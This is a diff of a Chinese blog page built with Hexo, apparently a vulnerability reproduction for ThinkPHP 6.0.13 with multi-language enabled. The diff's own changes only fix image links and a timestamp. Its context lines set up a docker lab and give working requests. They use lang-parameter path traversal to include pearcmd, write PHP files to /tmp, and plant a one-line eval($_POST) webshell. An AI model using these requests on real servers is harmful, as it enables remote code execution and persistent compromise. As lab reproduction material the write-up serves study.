@@ -13,15 +13,15 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="如果 Thinkphp 程序开启了多语言功能，那就可以通过 get、header、cookie 等位置传入参数，实现目录穿越+文件包含，通过 pearcmd 文件包含这个 trick 即可实现 RCE。 关于pearcmdpecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021617371.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021617516.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021618938.png">
-<meta property="og:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021619980.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021617371.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021617516.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021618938.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021619980.png">
 <meta property="article:published_time" content="2023-01-16T02:20:39.000Z">
-<meta property="article:modified_time" content="2023-10-02T08:22:44.619Z">
+<meta property="article:modified_time" content="2023-10-02T10:32:21.594Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cjb12.github.io/https://raw.githubusercontent.com/cjb12/Pics/master/202310021617371.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/cjb12/Pics/master/202310021617371.png">
   
     <link rel="alternate" href="/project/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -111,18 +111,18 @@
 
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull 7coinsec/thinkphp6013_lang_on</span><br><span class="line"></span><br><span class="line">docker run -it -d -p 3344:80 7coinsec/thinkphp6013_lang_on</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021617371.png" alt="image-20231002161728326"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021617371.png" alt="image-20231002161728326"></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先测试是否存在pearcmd，当返回如下图信息就代表pearcmd存在</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?lang=../../../../../../../../usr/local/lib/php/pearcmd</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021617516.png" alt="image-20231002161752479"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021617516.png" alt="image-20231002161752479"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&amp;/&lt;?phpinfo();?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021618938.png" alt="image-20231002161808892"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021618938.png" alt="image-20231002161808892"></p>
 <p>文件包含，直接包含上一步写入的文件或者其他方式上传的文件均可</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/index.php?lang=../../../../../../../../tmp/hello</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021619980.png" alt="image-20231002161916940"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021619980.png" alt="image-20231002161916940"></p>
 <p>写一句话木马</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?+config-create+/&amp;lang=../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[a]);?&gt;+/tmp/1.php</span><br></pre></td></tr></table></figure>
 
